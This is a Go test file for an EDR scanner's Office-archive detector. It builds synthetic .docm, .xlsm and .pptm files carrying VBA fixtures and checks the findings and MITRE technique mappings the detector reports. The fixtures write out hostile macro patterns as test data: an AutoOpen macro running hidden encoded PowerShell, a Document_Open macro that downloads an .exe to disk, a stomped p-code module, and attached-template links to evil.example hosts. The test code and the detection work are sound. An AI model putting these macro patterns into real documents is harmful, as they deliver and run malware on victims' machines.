package archive

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"io"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/1ungaka/sentinel-edr/scanner/ole"
)

// ── synthetic vbaProject.bin builders ───────────────────────────────────────────
//
// These are copies of the OLE package's test builders (scanner/ole/ole_test.go,
// stomp_test.go), reduced to what an embedded vbaProject.bin needs: a
// structurally valid [MS-CFB] compound file whose streams live in the regular
// FAT, an all-literal [MS-OVBA] CompressedContainer, and a dir stream that
// declares modules. They build DOCUMENT BYTES for the detector to read; nothing
// here compiles, runs or could be opened as a working macro. The OLE constants
// are restated locally because test code cannot be imported.

const (
	cfbObjStorage byte = 1
	cfbObjStream  byte = 2
	cfbObjRoot    byte = 5

	cfbFatSect    uint32 = 0xFFFFFFFD
	cfbEndOfChain uint32 = 0xFFFFFFFE
	cfbFreeSect   uint32 = 0xFFFFFFFF
	cfbNoStream   uint32 = 0xFFFFFFFF
)

var cfbSignature = [8]byte{0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1}

type oleEntry struct {
	name    string
	storage bool
	content []byte
	in      string
}

func u16(v uint16) []byte { b := make([]byte, 2); binary.LittleEndian.PutUint16(b, v); return b }
func u32(v uint32) []byte { b := make([]byte, 4); binary.LittleEndian.PutUint32(b, v); return b }

func buildCFB(entries ...oleEntry) []byte {
	const (
		sectorSize = 512
		entrySize  = 128
		perFat     = sectorSize / 4
	)
	type region struct{ start, count int }
	type built struct {
		name    string
		objType byte
		start   uint32
		size    uint64
		in      string
	}
	var dataSectors [][]byte
	var regions []region
	appendRegion := func(content []byte) uint32 {
		padded := make([]byte, ((len(content)+sectorSize-1)/sectorSize)*sectorSize)
		copy(padded, content)
		start := len(dataSectors)
		for off := 0; off < len(padded); off += sectorSize {
			sec := make([]byte, sectorSize)
			copy(sec, padded[off:off+sectorSize])
			dataSectors = append(dataSectors, sec)
		}
		regions = append(regions, region{start: start, count: len(padded) / sectorSize})
		return uint32(start)
	}

	dir := []built{{name: "Root Entry", objType: cfbObjRoot, start: cfbEndOfChain}}
	for _, e := range entries {
		switch {
		case e.storage:
			dir = append(dir, built{name: e.name, objType: cfbObjStorage, in: e.in})
		case e.content == nil:
			dir = append(dir, built{name: e.name, objType: cfbObjStream, start: cfbEndOfChain, in: e.in})
		default:
			content := e.content
			if len(content) < 4096 { // force regular-FAT storage
				p := make([]byte, 4096)
				copy(p, content)
				content = p
			}
			start := appendRegion(content)
			dir = append(dir, built{name: e.name, objType: cfbObjStream, start: start, size: uint64(len(content)), in: e.in})
		}
	}

	containerOf := func(i int) int {
		if dir[i].in != "" {
			for j := 1; j < len(dir); j++ {
				if j != i && dir[j].objType == cfbObjStorage && dir[j].name == dir[i].in {
					return j
				}
			}
		}
		return 0
	}
	firstChild := make([]uint32, len(dir))
	rightSib := make([]uint32, len(dir))
	lastChild := make([]int, len(dir))
	for i := range dir {
		firstChild[i], rightSib[i], lastChild[i] = cfbNoStream, cfbNoStream, -1
	}
	for i := 1; i < len(dir); i++ {
		c := containerOf(i)
		if lastChild[c] < 0 {
			firstChild[c] = uint32(i)
		} else {
			rightSib[lastChild[c]] = uint32(i)
		}
		lastChild[c] = i
	}

	nEntries := len(dir)
	dirBytes := make([]byte, ((nEntries*entrySize+sectorSize-1)/sectorSize)*sectorSize)
	for i, de := range dir {
		base := i * entrySize
		u := utf16.Encode([]rune(de.name))
		for j, c := range u {
			if 2*j+2 <= 64 {
				binary.LittleEndian.PutUint16(dirBytes[base+2*j:], c)
			}
		}
		nameLen := (len(u) + 1) * 2
		if nameLen > 64 {
			nameLen = 64
		}
		binary.LittleEndian.PutUint16(dirBytes[base+64:], uint16(nameLen))
		dirBytes[base+66] = de.objType
		dirBytes[base+67] = 1
		binary.LittleEndian.PutUint32(dirBytes[base+68:], cfbNoStream)
		binary.LittleEndian.PutUint32(dirBytes[base+72:], rightSib[i])
		binary.LittleEndian.PutUint32(dirBytes[base+76:], firstChild[i])
		binary.LittleEndian.PutUint32(dirBytes[base+116:], de.start)
		binary.LittleEndian.PutUint32(dirBytes[base+120:], uint32(de.size))
	}
	dirStart := appendRegion(dirBytes)

	D := len(dataSectors)
	F := 1
	for {
		T := D + F
		need := (T + perFat - 1) / perFat
		if need <= F {
			break
		}
		F = need
	}
	fat := make([]uint32, F*perFat)
	for i := range fat {
		fat[i] = cfbFreeSect
	}
	for _, rg := range regions {
		for k := 0; k < rg.count; k++ {
			if k == rg.count-1 {
				fat[rg.start+k] = cfbEndOfChain
			} else {
				fat[rg.start+k] = uint32(rg.start + k + 1)
			}
		}
	}
	for i := 0; i < F; i++ {
		fat[D+i] = cfbFatSect
	}
	fatBytes := make([]byte, F*sectorSize)
	for i, v := range fat {
		binary.LittleEndian.PutUint32(fatBytes[i*4:], v)
	}

	header := make([]byte, sectorSize)
	copy(header[0:8], cfbSignature[:])
	binary.LittleEndian.PutUint16(header[24:], 0x003E)
	binary.LittleEndian.PutUint16(header[26:], 0x0003)
	binary.LittleEndian.PutUint16(header[28:], 0xFFFE)
	binary.LittleEndian.PutUint16(header[30:], 0x0009)
	binary.LittleEndian.PutUint16(header[32:], 0x0006)
	binary.LittleEndian.PutUint32(header[44:], uint32(F))
	binary.LittleEndian.PutUint32(header[48:], dirStart)
	binary.LittleEndian.PutUint32(header[56:], 4096)
	binary.LittleEndian.PutUint32(header[60:], cfbEndOfChain)
	binary.LittleEndian.PutUint32(header[64:], 0)
	binary.LittleEndian.PutUint32(header[68:], cfbEndOfChain)
	binary.LittleEndian.PutUint32(header[72:], 0)
	for i := 0; i < 109; i++ {
		v := cfbFreeSect
		if i < F {
			v = uint32(D + i)
		}
		binary.LittleEndian.PutUint32(header[76+i*4:], v)
	}

	out := make([]byte, 0, sectorSize+(D+F)*sectorSize)
	out = append(out, header...)
	for _, sec := range dataSectors {
		out = append(out, sec...)
	}
	out = append(out, fatBytes...)
	return out
}

// compressVBA is the all-literal [MS-OVBA] CompressedContainer encoding.
func compressVBA(src []byte) []byte {
	const blockSize = 2048
	out := []byte{0x01}
	emit := func(block []byte) {
		var chunkData []byte
		for i := 0; i < len(block); i += 8 {
			chunkData = append(chunkData, 0x00)
			for j := i; j < i+8 && j < len(block); j++ {
				chunkData = append(chunkData, block[j])
			}
		}
		sizeField := len(chunkData) - 1
		if sizeField < 0 {
			sizeField = 0
		}
		header := uint16(0xB000) | uint16(sizeField&0x0FFF)
		out = append(out, u16(header)...)
		out = append(out, chunkData...)
	}
	if len(src) == 0 {
		emit(nil)
		return out
	}
	for start := 0; start < len(src); start += blockSize {
		end := start + blockSize
		if end > len(src) {
			end = len(src)
		}
		emit(src[start:end])
	}
	return out
}

func moduleStream(src string) []byte {
	prefix := []byte{0, 0, 0, 0, 0, 0, 0, 0}
	return append(prefix, compressVBA([]byte(src))...)
}

// dir-stream pieces for the stomping fixture.

func rec(id uint16, data []byte) []byte {
	out := make([]byte, 6, 6+len(data))
	binary.LittleEndian.PutUint16(out, id)
	binary.LittleEndian.PutUint32(out[2:], uint32(len(data)))
	return append(out, data...)
}

func utf16le(s string) []byte {
	var out []byte
	for _, c := range utf16.Encode([]rune(s)) {
		out = append(out, byte(c), byte(c>>8))
	}
	return out
}

// dirRecords returns a DECOMPRESSED dir stream declaring one procedural module
// whose source starts at offset.
func dirRecords(module string, offset uint32) []byte {
	var b []byte
	b = append(b, rec(0x0001, u32(1))...)
	b = append(b, rec(0x0002, u32(0x0409))...)
	b = append(b, rec(0x0014, u32(0x0409))...)
	b = append(b, rec(0x0003, u16(1252))...)
	b = append(b, rec(0x0004, []byte("Proj"))...)
	b = append(b, u16(0x0009)...)
	b = append(b, u32(4)...)
	b = append(b, u32(0x5F3A1C2B)...)
	b = append(b, u16(7)...)
	b = append(b, rec(0x000F, u16(1))...)
	b = append(b, rec(0x0013, u16(0xFFFF))...)
	b = append(b, rec(0x0019, []byte(module))...)
	b = append(b, rec(0x0047, utf16le(module))...)
	b = append(b, rec(0x001A, []byte(module))...)
	b = append(b, rec(0x0032, utf16le(module))...)
	b = append(b, rec(0x0031, u32(offset))...)
	b = append(b, rec(0x001E, u32(0))...)
	b = append(b, rec(0x002C, u16(0xFFFF))...)
	b = append(b, rec(0x0021, nil)...)
	b = append(b, rec(0x002B, nil)...)
	b = append(b, rec(0x0010, nil)...)
	return b
}

// filler returns n opaque bytes in 0x80..0xF7: no printable run, no 0x00 and
// no 0x01 container signature can arise from it.
func filler(n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = 0x80 | byte((i*37)%120)
	}
	return b
}

func pcodeRegion(n int, runs ...[]byte) []byte {
	b := filler(n)
	at := 64
	for _, r := range runs {
		copy(b[at:], r)
		at += len(r) + 40
	}
	return b
}

func vbaProjectStream(version uint16, idents ...string) []byte {
	b := []byte{0xCC, 0x61}
	b = append(b, u16(version)...)
	b = append(b, 0x00, 0xFF, 0xFF)
	for _, id := range idents {
		b = append(b, filler(12)...)
		b = append(b, id...)
	}
	return append(b, filler(12)...)
}

// ── the three vbaProject.bin fixtures ───────────────────────────────────────────

// vbaBenign: a VBA project whose one module is harmless (OLE score 2).
func vbaBenign() []byte {
	return buildCFB(
		oleEntry{name: "VBA", storage: true},
		oleEntry{name: "dir", in: "VBA", content: []byte("not a container")},
		oleEntry{name: "ThisDocument", in: "VBA", content: moduleStream(
			"Attribute VB_Name = \"ThisDocument\"\r\nSub Helper()\r\n    Dim x As Integer\r\n    x = 1\r\nEnd Sub\r\n")},
		oleEntry{name: "PROJECT", content: []byte("ID=\"{...}\"")},
	)
}

// vbaMalicious: AutoOpen + Shell(powershell) — the OLE pass's worked example
// (project 2 + autoexec 4 + shell 4 + powershell 4 = 14).
func vbaMalicious() []byte {
	return buildCFB(
		oleEntry{name: "VBA", storage: true},
		oleEntry{name: "dir", in: "VBA", content: []byte("not a container")},
		oleEntry{name: "NewMacros", in: "VBA", content: moduleStream(
			"Attribute VB_Name = \"NewMacros\"\r\nSub AutoOpen()\r\n" +
				"    Shell(\"powershell -nop -w hidden -enc ZQBjAGgA\"), vbHide\r\nEnd Sub\r\n")},
	)
}

// vbaDownload: Document_Open + URLDownloadToFile (project 2 + autoexec 4 +
// download 4 + late-binding 3 = 13).
func vbaDownload() []byte {
	return buildCFB(
		oleEntry{name: "VBA", storage: true},
		oleEntry{name: "PROJECT", content: []byte("ID=\"{...}\"")},
		oleEntry{name: "Module1", in: "VBA", content: moduleStream(
			"Sub Document_Open()\r\n    Dim h\r\n    Set h = CreateObject(\"MSXML2.XMLHTTP\")\r\n" +
				"    URLDownloadToFile 0, \"http://x/y.exe\", \"c:\\a.exe\", 0, 0\r\nEnd Sub\r\n")},
	)
}

// vbaStomped: a module with p-code but no source container at TextOffset, and
// p-code / project strings that name what ran (the OLE stomp test's
// "red: no source, and the p-code strings name what ran" case).
func vbaStomped() []byte {
	return buildCFB(
		oleEntry{name: "VBA", storage: true},
		oleEntry{name: "dir", in: "VBA", content: compressVBA(dirRecords("Module1", 3000))},
		oleEntry{name: "_VBA_PROJECT", in: "VBA", content: vbaProjectStream(0x00B2, "AutoOpen", "CreateObject")},
		oleEntry{name: "Module1", in: "VBA", content: pcodeRegion(3000, []byte("WScript.Shell"))},
	)
}

// ── OOXML zip builders ──────────────────────────────────────────────────────────

const contentTypesXML = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>`

// officeDoc returns the members every document of the given tree carries.
func officeDoc(tree string) []zipEntry {
	return []zipEntry{
		{"[Content_Types].xml", []byte(contentTypesXML)},
		{"_rels/.rels", []byte(`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>`)},
		{tree + "/document.xml", []byte(`<doc>hello</doc>`)},
		{"docProps/core.xml", []byte(`<cp:coreProperties/>`)},
	}
}

func settingsRels(target, mode string) []byte {
	return []byte(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="` + target + `" TargetMode="` + mode + `"/>
</Relationships>`)
}

func ooxmlFindings(r *Result) map[string]Finding {
	out := map[string]Finding{}
	for _, f := range r.Findings {
		if strings.HasPrefix(f.Class, ooxmlClassPrefix) {
			out[f.Class] = f
		}
	}
	return out
}

// ── format recognition ──────────────────────────────────────────────────────────

func TestOOXMLFormat(t *testing.T) {
	cases := []struct {
		name    string
		entries []zipEntry
		format  string
	}{
		{"docx", officeDoc("word"), "ooxml-word"},
		{"xlsx", officeDoc("xl"), "ooxml-excel"},
		{"pptx", officeDoc("ppt"), "ooxml-powerpoint"},
		{"office tree without [Content_Types].xml is a plain zip", officeDoc("xl")[1:], "zip"},
		{"[Content_Types].xml without an office tree is a plain zip",
			[]zipEntry{{"[Content_Types].xml", []byte(contentTypesXML)}, {"a.txt", []byte("x")}}, "zip"},
		{"case-insensitive names", []zipEntry{{"[CONTENT_TYPES].XML", []byte(contentTypesXML)}, {"XL/workbook.xml", []byte("<w/>")}}, "ooxml-excel"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := Analyze(buildZip(t, tc.entries), Options{})
			if r.Parsed == nil || r.Parsed.Format != tc.format {
				t.Fatalf("format = %+v, want %q", r.Parsed, tc.format)
			}
			if r.Score != 0 || len(r.Findings) != 0 || r.EmbeddedVBA != nil {
				t.Fatalf("a macro-free document produced findings: %+v (vba %v)", r.Findings, r.EmbeddedVBA)
			}
		})
	}
}

// ── embedded VBA project ────────────────────────────────────────────────────────

func TestOOXMLMacroDocuments(t *testing.T) {
	cases := []struct {
		name         string
		tree, member string
		vba          []byte
		wantDetected bool
		wantClasses  map[string]string // archive class -> technique
		wantState    string            // source state of the single module ("" = skip)
	}{
		{
			name: "benign .docm: project only, below threshold",
			tree: "word", member: "word/vbaProject.bin", vba: vbaBenign(),
			wantClasses: map[string]string{"archive.ooxml.vba.project": "T1059.005"},
		},
		{
			name: ".xlsm with AutoOpen + Shell(powershell)",
			tree: "xl", member: "xl/vbaProject.bin", vba: vbaMalicious(), wantDetected: true,
			wantClasses: map[string]string{
				"archive.ooxml.vba.project":     "T1059.005",
				"archive.ooxml.vba.autoexec":    "T1137",
				"archive.ooxml.exec.shell":      "T1059.005",
				"archive.ooxml.exec.powershell": "T1059.001",
			},
		},
		{
			name: ".docm with Document_Open + URLDownloadToFile",
			tree: "word", member: "word/vbaProject.bin", vba: vbaDownload(), wantDetected: true,
			wantClasses: map[string]string{
				"archive.ooxml.vba.autoexec":      "T1137",
				"archive.ooxml.download":          "T1105",
				"archive.ooxml.exec.late-binding": "T1059.005",
			},
		},
		{
			name: ".pptm, project under a macrosheets-style subdirectory",
			tree: "ppt", member: "ppt/macros/vbaProject.bin", vba: vbaMalicious(), wantDetected: true,
			wantClasses: map[string]string{"archive.ooxml.vba.autoexec": "T1137"},
		},
		{
			name: "stomped .xlsm: p-code without source, strings name what ran",
			tree: "xl", member: "xl/vbaProject.bin", vba: vbaStomped(), wantDetected: true,
			wantClasses: map[string]string{
				"archive.ooxml.vba.project":              "T1059.005",
				"archive.ooxml.vba.stomp.source-missing": "T1564.007",
				"archive.ooxml.vba.stomp.mismatch":       "T1564.007",
			},
			wantState: "missing",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			entries := append(officeDoc(tc.tree), zipEntry{tc.member, tc.vba})
			data := buildZip(t, entries)
			r := Analyze(data, Options{})

			// The same project standalone, through the OLE pass.
			standalone := ole.Analyze(tc.vba, ole.Options{})
			if standalone.Parsed == nil || !standalone.Parsed.HasVBA {
				t.Fatalf("fixture is not a VBA project under the OLE pass: %+v", standalone.Parsed)
			}
			if r.Detected() != tc.wantDetected {
				t.Fatalf("Detected()=%v, want %v (score %d, findings %+v)", r.Detected(), tc.wantDetected, r.Score, r.Findings)
			}
			if r.Detected() != standalone.Detected() {
				t.Fatalf("container verdict %v differs from the OLE pass's standalone verdict %v", r.Detected(), standalone.Detected())
			}
			if r.Score != standalone.Score {
				t.Fatalf("container score %d != OLE standalone score %d (no other container finding should fire)", r.Score, standalone.Score)
			}
			if r.EmbeddedVBA == nil || r.EmbeddedVBA.Parsed == nil || !r.EmbeddedVBA.Parsed.HasVBA {
				t.Fatalf("EmbeddedVBA not carried: %+v", r.EmbeddedVBA)
			}
			if r.EmbeddedVBA.Score != standalone.Score || r.EmbeddedVBA.Threshold != ole.DefaultThreshold {
				t.Fatalf("EmbeddedVBA score/threshold = %d/%d, want %d/%d", r.EmbeddedVBA.Score, r.EmbeddedVBA.Threshold, standalone.Score, ole.DefaultThreshold)
			}
			if r.EmbeddedVBA.FilePath != tc.member || r.Parsed.VBAMember != tc.member {
				t.Fatalf("member attribution = %q / %q, want %q", r.EmbeddedVBA.FilePath, r.Parsed.VBAMember, tc.member)
			}
			got := ooxmlFindings(r)
			if len(got) != len(standalone.Findings) {
				t.Fatalf("%d carried findings, OLE pass raised %d: %+v vs %+v", len(got), len(standalone.Findings), got, standalone.Findings)
			}
			for class, tech := range tc.wantClasses {
				f, ok := got[class]
				if !ok {
					t.Fatalf("missing %s; got %+v", class, got)
				}
				if f.Technique != tech {
					t.Fatalf("%s technique = %q, want %q", class, f.Technique, tech)
				}
				if f.Via != tc.member {
					t.Fatalf("%s via = %q, want %q", class, f.Via, tc.member)
				}
			}
			for _, f := range r.Findings {
				if !strings.HasPrefix(f.Class, ooxmlClassPrefix) {
					t.Fatalf("a container-level finding fired on a plain macro document: %+v", f)
				}
			}
			if tc.wantState != "" {
				p := r.EmbeddedVBA.Parsed
				if len(p.VBAProjects) != 1 || len(p.VBAProjects[0].Modules) != 1 {
					t.Fatalf("module table not carried: %+v", p.VBAProjects)
				}
				if st := p.VBAProjects[0].Modules[0].SourceState; st != tc.wantState {
					t.Fatalf("module source_state = %q, want %q", st, tc.wantState)
				}
			}
			// JSON carries the embedded result under embedded_vba with has_vba.
			js, err := json.Marshal(r)
			if err != nil {
				t.Fatal(err)
			}
			if !bytes.Contains(js, []byte(`"embedded_vba":{`)) || !bytes.Contains(js, []byte(`"has_vba":true`)) {
				t.Fatalf("json lacks embedded_vba/has_vba: %s", js)
			}
			if !bytes.Contains(js, []byte(`"via":"`+tc.member+`"`)) || !bytes.Contains(js, []byte(`"vba_member":"`+tc.member+`"`)) {
				t.Fatalf("json lacks via/vba_member: %s", js)
			}
		})
	}
}

// TestOOXMLZipIsNotOLE confirms the engine cannot double-score a macro
// document: the OLE pass over the zip itself sees no compound file.
func TestOOXMLZipIsNotOLE(t *testing.T) {
	data := buildZip(t, append(officeDoc("xl"), zipEntry{"xl/vbaProject.bin", vbaMalicious()}))
	if ole.IsOLE(data) {
		t.Fatal("a zip must not read as a compound file")
	}
	if r := ole.Analyze(data, ole.Options{}); r.Score != 0 || r.Parsed != nil {
		t.Fatalf("OLE pass over the zip produced output: %+v", r)
	}
}

func TestOOXMLVBAThresholdOption(t *testing.T) {
	data := buildZip(t, append(officeDoc("xl"), zipEntry{"xl/vbaProject.bin", vbaBenign()}))
	r := Analyze(data, Options{OLEThreshold: 2, Threshold: 20})
	if r.EmbeddedVBA == nil || r.EmbeddedVBA.Threshold != 2 || !r.EmbeddedVBA.Detected() {
		t.Fatalf("OLEThreshold not applied to the embedded result: %+v", r.EmbeddedVBA)
	}
	if r.Threshold != 20 || r.Detected() {
		t.Fatalf("the container verdict must use the archive threshold: %d/%d", r.Score, r.Threshold)
	}
}

func TestOOXMLVBAProjectNotACompoundFile(t *testing.T) {
	// The name alone anchors nothing: a vbaProject.bin that is plain text is
	// inspected (the OLE pass sees no compound file) and produces no finding.
	data := buildZip(t, append(officeDoc("word"), zipEntry{"word/vbaProject.bin", []byte("this is not a compound file")}))
	r := Analyze(data, Options{})
	if r.Score != 0 || len(r.Findings) != 0 {
		t.Fatalf("name-only member produced findings: %+v", r.Findings)
	}
	if r.EmbeddedVBA == nil || r.EmbeddedVBA.Parsed != nil {
		t.Fatalf("expected an inert OLE result, got %+v", r.EmbeddedVBA)
	}
}

func TestOOXMLVBAProjectOverCap(t *testing.T) {
	// 40 MiB declared (and real, but all zeros so the zip is tiny): refused by
	// declared size before a byte is decompressed.
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, e := range officeDoc("xl") {
		w, _ := zw.Create(e.name)
		w.Write(e.data)
	}
	w, _ := zw.Create("xl/vbaProject.bin")
	if _, err := io.Copy(w, io.LimitReader(zeroReader{}, 40<<20)); err != nil {
		t.Fatal(err)
	}
	zw.Close()
	r := Analyze(buf.Bytes(), Options{})
	if r.EmbeddedVBA != nil || len(ooxmlFindings(r)) != 0 {
		t.Fatalf("over-cap project was inspected: %+v", r)
	}
	if r.Parsed == nil || !strings.Contains(r.Parsed.NotInspected, "VBA project cap") {
		t.Fatalf("refusal not reported: %+v", r.Parsed)
	}
	if r.Parsed.Format != "ooxml-excel" {
		t.Fatalf("format = %q", r.Parsed.Format)
	}
}

func TestOOXMLVBAProjectLyingHeader(t *testing.T) {
	// A central directory that under-declares the member: the stream is cut
	// at the cap and the member refused, never expanded past it.
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, e := range officeDoc("xl") {
		w, _ := zw.Create(e.name)
		w.Write(e.data)
	}
	w, _ := zw.Create("xl/vbaProject.bin")
	if _, err := io.Copy(w, io.LimitReader(zeroReader{}, maxVBAProjectBytes+(1<<20))); err != nil {
		t.Fatal(err)
	}
	zw.Close()
	data := buf.Bytes()
	patched := false
	for i := 0; i+46 < len(data); i++ {
		if data[i] == 'P' && data[i+1] == 'K' && data[i+2] == 1 && data[i+3] == 2 {
			nameLen := int(binary.LittleEndian.Uint16(data[i+28:]))
			if string(data[i+46:i+46+nameLen]) == "xl/vbaProject.bin" {
				binary.LittleEndian.PutUint32(data[i+24:], 1000) // uncompressed size
				patched = true
			}
		}
	}
	if !patched {
		t.Fatal("central directory entry not found")
	}
	r := Analyze(data, Options{})
	if r.EmbeddedVBA != nil || len(ooxmlFindings(r)) != 0 {
		t.Fatalf("lying member was inspected: %+v", r)
	}
	if r.Parsed == nil || r.Parsed.NotInspected == "" {
		t.Fatalf("refusal not reported: %+v", r.Parsed)
	}
}

func TestOOXMLEncryptedVBAProject(t *testing.T) {
	data := buildZip(t, append(officeDoc("xl"), zipEntry{"xl/vbaProject.bin", vbaMalicious()}))
	setEncryptedBit(data)
	r := Analyze(data, Options{})
	if r.EmbeddedVBA != nil {
		t.Fatal("an encrypted member must not be opened")
	}
	if !has(r, "archive.encrypted-entry") || !strings.Contains(r.Parsed.NotInspected, "encrypted") {
		t.Fatalf("encryption not reported: %+v / %+v", r.Findings, r.Parsed)
	}
}

func TestOOXMLTwoVBAProjectsFirstWins(t *testing.T) {
	// A benign decoy first and a second copy: only one project is expanded,
	// the other is reported. Office itself loads one project per document.
	data := buildZip(t, append(officeDoc("word"),
		zipEntry{"word/vbaProject.bin", vbaBenign()},
		zipEntry{"word/embeddings/vbaProject.bin", vbaMalicious()}))
	r := Analyze(data, Options{})
	if r.Parsed.VBAMember != "word/vbaProject.bin" || r.Score != 2 {
		t.Fatalf("first project not the one inspected: %+v score %d", r.Parsed, r.Score)
	}
	if !strings.Contains(r.Parsed.NotInspected, "already inspected") {
		t.Fatalf("second project not reported: %+v", r.Parsed)
	}
}

// ── nesting ─────────────────────────────────────────────────────────────────────

func TestOOXMLNested(t *testing.T) {
	docm := buildZip(t, append(officeDoc("word"), zipEntry{"word/vbaProject.bin", vbaMalicious()}))

	// A macro document inside a plain zip: the outer container is a zip, the
	// inner document is not unwrapped (that is the peeler's job), and nothing
	// is scored from it.
	outer := buildZip(t, []zipEntry{{"readme.txt", []byte("hi")}, {"invoice.docm", docm}})
	r := Analyze(outer, Options{})
	if r.Parsed.Format != "zip" || r.EmbeddedVBA != nil || len(ooxmlFindings(r)) != 0 {
		t.Fatalf("nested document was scored through the outer zip: %+v", r)
	}

	// A document carrying a zip member: still a document, still inspected,
	// and the nested-archive observation fires as it would for any zip.
	inner := buildZip(t, append(officeDoc("word"),
		zipEntry{"word/vbaProject.bin", vbaMalicious()},
		zipEntry{"word/embeddings/bundle.zip", buildZip(t, []zipEntry{{"x", []byte("y")}})}))
	r = Analyze(inner, Options{})
	if r.Parsed.Format != "ooxml-word" || !has(r, "archive.nested-archive") || !has(r, "archive.ooxml.vba.autoexec") {
		t.Fatalf("document with a zip member: %+v", r.Findings)
	}
	if r.Score != 14+scoreNested {
		t.Fatalf("score = %d", r.Score)
	}
}

// ── remote template ─────────────────────────────────────────────────────────────

func TestOOXMLRemoteTemplate(t *testing.T) {
	cases := []struct {
		name     string
		rels     []byte
		wantHost string // "" = no finding
	}{
		{"relative template path", settingsRels("Normal.dotm", "External"), ""},
		{"drive path", settingsRels("file:///C:/Users/me/AppData/Roaming/Microsoft/Templates/Normal.dotm", "External"), ""},
		{"backslash drive path", settingsRels(`C:\Users\me\Templates\report.dotx`, "External"), ""},
		{"UNC path is outside this check", settingsRels(`\\fileserver\templates\report.dotx`, "External"), ""},
		{"http", settingsRels("http://evil.example/t.dotm", "External"), "evil.example"},
		{"https with port, userinfo and query", settingsRels("https://u:p@cdn.evil.example:8443/a/b.dotm?x=1#f", "External"), "cdn.evil.example"},
		{"file host", settingsRels("file://share.evil.example/t/x.dotm", "External"), "share.evil.example"},
		{"mixed case scheme and type", []byte(`<Relationships><Relationship Id="rId9" Type="http://purl.oclc.org/ooxml/officeDocument/relationships/AttachedTemplate" Target="HTTPS://Evil.Example/x.dotm"/></Relationships>`), "Evil.Example"},
		{"other relationship type with a URL is not a template", []byte(`<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/" TargetMode="External"/></Relationships>`), ""},
		{"malformed xml", []byte(`<Relationships><Relationship Type="x/attachedTemplate" Target="http://evil.example/`), ""},
		{"empty", nil, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			data := buildZip(t, append(officeDoc("word"),
				zipEntry{"word/settings.xml", []byte(`<w:settings><w:attachedTemplate r:id="rId1"/></w:settings>`)},
				zipEntry{"word/_rels/settings.xml.rels", tc.rels}))
			r := Analyze(data, Options{})
			f, ok := ooxmlFindings(r)["archive.ooxml.remote-template"]
			if tc.wantHost == "" {
				if ok || r.Score != 0 {
					t.Fatalf("unexpected finding: %+v", r.Findings)
				}
				return
			}
			if !ok {
				t.Fatalf("remote template not reported: %+v", r.Findings)
			}
			if f.Evidence != tc.wantHost || f.Technique != "T1221" || f.Via != "word/_rels/settings.xml.rels" || f.Score != scoreRemoteTemplate {
				t.Fatalf("finding = %+v, want host %q", f, tc.wantHost)
			}
			if strings.Contains(f.Evidence, "/") || strings.Contains(f.Detail, "http") {
				t.Fatalf("finding carries the URL: %+v", f)
			}
		})
	}
	// Not a Word document: the same part under xl/ is never opened.
	data := buildZip(t, append(officeDoc("xl"), zipEntry{"word/_rels/settings.xml.rels", settingsRels("http://evil.example/t.dotm", "External")}))
	if r := Analyze(data, Options{}); len(r.Findings) != 0 {
		t.Fatalf("settings rels inspected outside a Word document: %+v", r.Findings)
	}
}

func TestURLHost(t *testing.T) {
	cases := map[string]string{
		"http://a.example/x":            "a.example",
		"HTTPS://A.Example:443/x":       "A.Example",
		"file://srv/share/x.dotm":       "srv",
		"file:///C:/x.dotm":             "",
		"https://[2001:db8::1]:8080/x":  "[2001:db8::1]",
		"http://user@host.example#frag": "host.example",
		"http://":                       "",
		"ftp://a.example/x":             "",
		"../x.dotm":                     "",
		"http://" + strings.Repeat("a", 300) + ".example/": strings.Repeat("a", maxHostLen),
		"http://h\x7fst\u00e9.example/":                    "h?st??.example",
	}
	for in, want := range cases {
		got, ok := urlHost(in)
		if (want != "") != ok || got != want {
			t.Errorf("urlHost(%q) = %q,%v; want %q", in, got, ok, want)
		}
	}
}

// ── catalog ─────────────────────────────────────────────────────────────────────

func TestOOXMLCatalog(t *testing.T) {
	declared := map[string]Class{}
	for _, c := range Classes() {
		if _, dup := declared[c.Class]; dup {
			t.Fatalf("duplicate catalog class %q", c.Class)
		}
		declared[c.Class] = c
	}
	for _, c := range ole.Classes() {
		m, ok := declared[ooxmlClass(c.Class)]
		if !ok {
			t.Fatalf("OLE class %q has no archive.ooxml.* catalog row", c.Class)
		}
		if m.Technique != c.Technique || m.Weight != c.Weight {
			t.Fatalf("%q = %+v differs from the OLE row %+v", m.Class, m, c)
		}
	}
	if _, ok := declared["archive.ooxml.remote-template"]; !ok {
		t.Fatal("remote-template class not declared")
	}
	// Every class the fixtures emit is declared with the technique and weight
	// it was emitted with.
	fixtures := [][]zipEntry{
		append(officeDoc("xl"), zipEntry{"xl/vbaProject.bin", vbaMalicious()}),
		append(officeDoc("word"), zipEntry{"word/vbaProject.bin", vbaDownload()}),
		append(officeDoc("xl"), zipEntry{"xl/vbaProject.bin", vbaStomped()}),
		append(officeDoc("word"), zipEntry{"word/_rels/settings.xml.rels", settingsRels("http://evil.example/t.dotm", "External")}),
	}
	for _, fx := range fixtures {
		for _, f := range Analyze(buildZip(t, fx), Options{}).Findings {
			c, ok := declared[f.Class]
			if !ok {
				t.Fatalf("emitted class %q is not in the catalog", f.Class)
			}
			if c.Technique != f.Technique || c.Weight != f.Score {
				t.Fatalf("emitted %+v disagrees with catalog row %+v", f, c)
			}
		}
	}
}

// ── cost ────────────────────────────────────────────────────────────────────────
//
